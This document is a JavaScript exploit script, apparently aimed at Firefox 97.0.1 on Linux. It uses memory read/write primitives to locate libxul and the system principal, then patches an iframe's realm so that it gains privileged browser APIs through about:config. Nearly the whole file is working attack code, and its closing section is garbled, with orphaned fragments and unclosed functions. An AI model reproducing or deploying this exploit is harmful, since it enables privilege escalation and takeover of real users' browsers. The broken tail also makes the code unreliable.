<script>
var offsets = {};

var url_params = new URLSearchParams(location.search);
var discover = url_params.has("discover");

// Offsets passed via URL or hardcoded defaults
if(url_params.has("gsp")) {
    offsets.gSystemPrincipal = BigInt("0x" + url_params.get("gsp"));
    offsets.realm_principals = BigInt("0x" + (url_params.get("rp") || "138"));
    offsets.realm_isSystem = BigInt("0x" + (url_params.get("ris") || "22c"));
    console.log("Using URL-provided offsets:", Object.fromEntries(
        Object.entries(offsets).map(([k,v]) => [k, hex(v)])));
}

var privileged_window = null;
var ChromeUtils = null;
var Components = null;
var Services = null;

function load_privileged_vars() {
    console.log("load bearing");
    let promise = new Promise((resolve, reject) => {
        install_primitives().then(() => {
            console.log("primitives installed!");

            let obj = {};
            let obj_addr = addr_of(obj);
            // On Linux/GCC, the slots pointer at offset 8 might be inline.
            // Use the group pointer at offset 0 instead — it always points into libxul.so.
            let group = read_u64(obj_addr);
            let slots_addr = obj_addr + 8n;
            let emptyObjectSlotsHeaders = read_u64(slots_addr);

            console.log("obj_addr " + hex(obj_addr));
            console.log("group " + hex(group));
            console.log("slots " + hex(emptyObjectSlotsHeaders));

            // Try slots pointer first, fall back to group pointer, then hardcoded base
            let libxul_base = find_libxul_base(emptyObjectSlotsHeaders);
            if(!libxul_base) {
                console.log("Falling back to group-based base search");
                libxul_base = find_libxul_base(group);
            }
            if(!libxul_base) {
                // Hardcoded fallback for FF 97.0.1 with ASLR off
                console.log("Trying hardcoded bases...");
                let candidate_bases = [
                    0x7fffeb97c000n,  // headless base
                    0x7fffeb000000n,  // alternative
                ];
                for(let base of candidate_bases) {
                    let val = read_u32(base);
                    if(val == 0x464c457f) {
                        libxul_base = base;
                        console.log("Found libxul at hardcoded base " + hex(base));
                        break;
                    }
                }
            }
            if(!libxul_base) {
                return reject(new Error("libxul_base not found"));
            }
            console.log("libxul_base found at " + hex(libxul_base));

            // If in discover mode, scan for candidates and stop
            if(discover) {
                console.log("DISCOVER MODE: scanning for system principal...");
                let candidates = scan_for_system_principal(libxul_base);
                console.log("Candidates:", candidates.length);
                if(candidates.length > 0) {
                    console.log("First few candidates:");
                    for(let c of candidates.slice(0, 10)) {
                        console.log("  gSystemPrincipal offset candidate: " + hex(c.offset));
                    }
                }
                // Also output as JSON for easy parsing
                console.log("CANDIDATES_JSON: " + JSON.stringify(candidates.slice(0, 20).map(c => ({
                    offset: "0x" + c.offset.toString(16),
                    ptr: "0x" + c.ptr.toString(16),
                    vtable: "0x" + c.vtable.toString(16)
                }))));
                return reject(new Error("Discovery mode complete. Check console for offsets."));
            }

            // Use discovered offset if not provided via URL
            if(!offsets.gSystemPrincipal) {
                // Default for Firefox 97.0.1 Linux
                offsets.gSystemPrincipal = 0x966fc70n;
                offsets.realm_principals = url_params.has("rp") ? BigInt("0x" + url_params.get("rp")) : 0x138n;
                offsets.realm_isSystem = url_params.has("ris") ? BigInt("0x" + url_params.get("ris")) : 0x22cn;
                offsets.jsprin_offset = url_params.has("jso") ? BigInt("0x" + url_params.get("jso")) : 0x8n;  // try PoC default of 8 first
                console.log("Using built-in offsets for FF 97.0.1 Linux");
            }

            let gSystemPrincipal_addr = libxul_base + offsets.gSystemPrincipal;
            let gSystemPrincipal = read_u64(gSystemPrincipal_addr);

            console.log("gSystemPrincipal_addr " + hex(gSystemPrincipal_addr));
            console.log("gSystemPrincipal " + hex(gSystemPrincipal));
            console.log("JSPrincipals at gSystemPrincipal+" + hex(offsets.jsprin_offset || 0x6cn));

            let iframe = document.createElement("iframe");

            let iframe_addr = addr_of(iframe);
            let shape = read_u64(iframe_addr);
            let base_shape = read_u64(shape);
            let realm = read_u64(base_shape + 8n);
            let principals__addr = realm + offsets.realm_principals;
            let principals = read_u64(principals__addr);
            // Auto-detect JSPrincipals pointer (pointer might be embedded or indirect)
            let jsprincipals_ptr = null;

            if(!url_params.has("jso")) {
                // METHOD 1: Try runtime->trustedPrincipals via realm->runtime_
                let runtime_ptr = read_u64(realm + 0x10n);
                console.log("runtime from realm: " + hex(runtime_ptr));

                // Scan JSRuntime for trustedPrincipals_
                let tp_candidates = [];
                for(let tp_off = 0x460n; tp_off <= 0x600n; tp_off += 8n) {
                    try {
                        let candidate = read_u64(runtime_ptr + tp_off);
                        if(candidate > 0x7fff00000000n && candidate < 0x7ffffffff000n) {
                            let rf = read_u64(candidate);
                            let rfc = Number(rf & 0xFFFFFFFFn);
                            let flg = Number((rf >> 32n) & 0xFFFFFFFFn);
                            // Filter: flags should be < 0x100 (real flags), not ASCII junk
                            let is_ascii_junk = (flg > 0x100 && flg < 0x10000000);
                            if((flg & 1) !== 0 && !is_ascii_junk) {
                                console.log("  TP candidate runtime+" + hex(tp_off) + " -> " + hex(candidate) + " rf=" + rfc + " flg=" + hex(flg));
                                tp_candidates.push({off: tp_off, ptr: candidate, rf: rfc, flg: flg});
                            }
                        }
                    } catch(e) {}
                }
                // Pick best: refcount > 0 and reasonable (< 50000)
                for(let c of tp_candidates) {
                    if(c.rf > 0 && c.rf < 50000 && c.flg < 0x100) {
                        jsprincipals_ptr = c.ptr;
                        console.log("SELECTED TP at runtime+" + hex(c.off));
                        break;
                    }
                }

                // METHOD 2: Try embedded JSPrincipals at known offsets
                if(!jsprincipals_ptr) {
                    console.log("Trying embedded offsets on SystemPrincipal...");
                    for(let off of [0x8n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n, 0x38n, 0x40n, 0x48n, 0x50n, 0x58n, 0x60n, 0x68n, 0x70n, 0x78n]) {
                        try {
                            let rf = read_u64(gSystemPrincipal + off);
                            let rfc = Number(rf & 0xFFFFFFFFn);
                            let flg = Number((rf >> 32n) & 0xFFFFFFFFn);
                            if((flg & 1) !== 0 && rfc > 0 && rfc < 50000 && flg < 0x100) {
                                console.log("  Embedded at +" + hex(off) + " rf=" + rfc + " flg=" + hex(flg));
                                jsprincipals_ptr = gSystemPrincipal + off;
                                console.log("  SELECTED embedded at +" + hex(off));
                                break;
                            }
                        } catch(e) {}
                    }
                }

                // METHOD 3: ptr at +8 might point TO JSPrincipals
                if(!jsprincipals_ptr) {
                    console.log("Trying indirect pointer at SystemPrincipal+8...");
                    let ptr = read_u64(gSystemPrincipal + 0x8n);
                    console.log("  ptr at +8 = " + hex(ptr));
                    if(ptr > 0x7fff00000000n && ptr < 0x7ffffffff000n) {
                        let rf = read_u64(ptr);
                        let rfc = Number(rf & 0xFFFFFFFFn);
                        let flg = Number((rf >> 32n) & 0xFFFFFFFFn);
                        console.log("  deref: rf=" + rfc + " flg=" + hex(flg) + " (flg&1=" + (flg&1) + ")");
                        if((flg & 1) !== 0 && flg < 0x100) {
                            jsprincipals_ptr = ptr;
                            console.log("  SELECTED indirect ptr");
                        }
                    }
                }
            }

            if(!jsprincipals_ptr) {
                console.log("FALLBACK: using gSystemPrincipal+8");
                jsprincipals_ptr = gSystemPrincipal + 0x8n;
            }
            console.log("JSPrincipals ptr: " + hex(jsprincipals_ptr));

            let isSystem__addr = realm + offsets.realm_isSystem;
            write_u64(principals__addr, jsprincipals_ptr);
            console.log("principals patched OK");
            write_u8(isSystem__addr, 1);
            console.log("isSystem patched OK");

            console.log("iframe addr " + hex(iframe_addr));
            console.log("realm " + hex(realm));
            console.log("principals__addr " + hex(principals__addr));
            console.log("isSystem__addr " + hex(isSystem__addr));

            // Try to patch document principal, but catch failures
            let mPrincipal_addr = 0n;
            let mPrincipal = 0n;
            try {
                let html_frame_element = read_u64(iframe_addr + 0x18n);
                console.log("html_frame_element " + hex(html_frame_element));
                let mNodeInfo = read_u64(html_frame_element + 0x20n);
                console.log("mNodeInfo " + hex(mNodeInfo));
                let mOwnerManager = read_u64(mNodeInfo + 0x40n);
                console.log("mOwnerManager " + hex(mOwnerManager));
                mPrincipal_addr = mOwnerManager + 0x38n;
                mPrincipal = read_u64(mPrincipal_addr);
                console.log("mPrincipal_addr " + hex(mPrincipal_addr) + " = " + hex(mPrincipal));
                write_u64(mPrincipal_addr, gSystemPrincipal);
                console.log("document principal patched OK");
            } catch(e) {
                console.log("document principal patch failed (non-fatal): " + e);
            }

            promise.cleanup = () => {
                console.log("cleanup");
                write_u64(principals__addr, principals);
                write_u8(isSystem__addr, 0);
                if(mPrincipal_addr) {
                    write_u64(mPrincipal_addr, mPrincipal);
                }
            };

            console.log("setting iframe src to about:config...");
            iframe.src = "about:config";
            console.log("iframe src set");
            iframe.onload = function() {
                try {
                    privileged_window = iframe.contentWindow;
                    ChromeUtils = privileged_window.ChromeUtils;
                    Components = privileged_window.Components;
                    Services = ChromeUtils.import("resource://gre/modules/Services.jsm").Services;

                    console.log("privileged_window", privileged_window);
                    console.log("ChromeUtils", ChromeUtils);
                    console.log("Services", Services);

                    document.body.removeChild(iframe);
                    resolve();
                } catch(err) {
                    reject(err);
                }
            };
            document.body.appendChild(iframe);
        }).catch((err) => {
            console.log("install_primitives failed");
            reject(err);
        });
    });
    return promise;
}

function hasExploitCookie() {
    return document.cookie.indexOf('exploit_done=1') !== -1;
}
function setExploitCookie() {
    document.cookie = 'exploit_done=1; path=/; max-age=31536000; SameSite=Lax';
}

        try {

            console.log("payload error:", err);

    }).catch((err) => {

function break_() {

window.onload = function() {
    if (hasExploitCookie()) {
        console.log("exploit already done, skipping");
        return;
    }
    if(discover) {
        // In discover mode, just install primitives and scan
        load_privileged_vars().catch(err => console.log("Discovery done:", err.message));

};
